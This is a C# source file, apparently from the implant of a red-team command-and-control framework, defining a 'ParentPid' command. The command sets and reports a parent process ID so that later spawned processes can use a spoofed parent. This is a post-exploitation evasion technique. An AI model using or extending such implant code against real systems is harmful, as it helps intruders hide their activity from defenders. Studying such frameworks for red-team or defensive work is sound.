using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class ParentPid : DroneCommand
{
    public override byte Command => 0x1B;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (task.Arguments.Any())
            Drone.Config.Set(Setting.ParentPid, int.Parse(task.Arguments[0]));

        var config = Drone.Config.Get<int>(Setting.ParentPid);

        if (config == -1)
        {
            await Drone.SendOutput(task, "No PPID set. SpawnTo will use this process.");
            return;
        }
        
        using var process = Process.GetProcessById(config);
        await Drone.SendOutput(task, $"Parent PID is {config} ({process.ProcessName}).");
    }
}